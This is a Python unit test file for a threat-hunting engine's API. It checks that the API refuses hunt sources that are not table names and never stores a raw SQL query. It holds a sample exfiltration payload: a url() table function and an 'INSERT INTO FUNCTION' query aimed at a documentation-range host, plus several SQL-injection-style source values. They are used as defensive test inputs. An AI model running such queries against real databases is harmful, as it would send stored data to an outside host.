#  Project:      dfe-engine
#  File:         tests/unit/test_api/test_hunt_source_table_api.py
#  Purpose:      The hunt API refuses a source that is not a table name, and stores no query
#  Language:     Python
#
#  License:      BUSL-1.1
#  Copyright:    (c) 2026 HYPERI PTY LIMITED
"""Hunt create and update answer 422 for a non-table source, and never write a ``query``.

The hunt runner splices the source into ``FROM``, so a source such as
``url(...)`` would read another host. A direct ``query`` is SQL the runner runs
as written; the hunt request models have no such field, so one sent is dropped
rather than stored. The address is in the documentation range (RFC 5737).
"""

from pathlib import Path

import pytest

from dfe_engine.yaml_utils import yaml_load

EXFIL = "url('http://203.0.113.9/x', 'JSONEachRow')"

_HUNT = {
    "display_name": "Certutil Abuse",
    "cron": "*/5 * * * *",
    "customers": ["org_a"],
    "global_target_table_name": "dfe.detection",
    "rules": ["certutil"],
}

REFUSED = [EXFIL, "dfe.main extra", "dfe.main()", "dfe.main) -- x", "a.b.c"]


@pytest.mark.parametrize("source", REFUSED)
def test_creating_a_hunt_with_a_non_table_source_is_refused(client, admin_headers, source):
    resp = client.post(
        "/api/v1/hunts",
        json={"name": "windows_hunt", **_HUNT, "global_source_table_name": source},
        headers=admin_headers,
    )

    assert resp.status_code == 422, resp.text
    assert "is not a table name" in resp.json()["message"]
    assert client.get("/api/v1/hunts/windows_hunt", headers=admin_headers).status_code == 404


@pytest.mark.parametrize("source", ["dfe.main", "main"])
def test_creating_a_hunt_with_a_plain_source_is_saved(client, admin_headers, source):
    resp = client.post(
        "/api/v1/hunts",
        json={"name": "windows_hunt", **_HUNT, "global_source_table_name": source},
        headers=admin_headers,
    )

    assert resp.status_code == 201, resp.text
    assert resp.json()["global_source_table_name"] == source


def test_updating_a_hunt_to_a_non_table_source_is_refused_and_keeps_the_old_one(
    client, admin_headers
):
    created = client.post(
        "/api/v1/hunts",
        json={"name": "windows_hunt", **_HUNT, "global_source_table_name": "dfe.main"},
        headers=admin_headers,
    )
    assert created.status_code == 201, created.text

    resp = client.put(
        "/api/v1/hunts/windows_hunt",
        json={**_HUNT, "global_source_table_name": EXFIL},
        headers=admin_headers,
    )

    assert resp.status_code == 422, resp.text
    assert "is not a table name" in resp.json()["message"]
    stored = client.get("/api/v1/hunts/windows_hunt", headers=admin_headers).json()
    assert stored["global_source_table_name"] == "dfe.main"


@pytest.mark.parametrize("method", ["post", "put"])
def test_a_query_sent_to_the_hunt_api_is_never_written(client, admin_headers, api_settings, method):
    query = f"INSERT INTO FUNCTION {EXFIL} SELECT * FROM dfe.main WHERE {{window}}"
    body = {**_HUNT, "global_source_table_name": "dfe.main"}
    created = client.post(
        "/api/v1/hunts", json={"name": "windows_hunt", **body}, headers=admin_headers
    )
    assert created.status_code == 201, created.text

    if method == "post":
        client.delete("/api/v1/hunts/windows_hunt", headers=admin_headers)
        resp = client.post(
            "/api/v1/hunts",
            json={"name": "windows_hunt", **body, "query": query},
            headers=admin_headers,
        )
        assert resp.status_code == 201, resp.text
    else:
        resp = client.put(
            "/api/v1/hunts/windows_hunt", json={**body, "query": query}, headers=admin_headers
        )
        assert resp.status_code == 200, resp.text

    stored = yaml_load(Path(api_settings.hunts.hunt_dir) / "windows_hunt.yaml")
    assert "query" not in stored
    assert stored["global_source_table_name"] == "dfe.main"
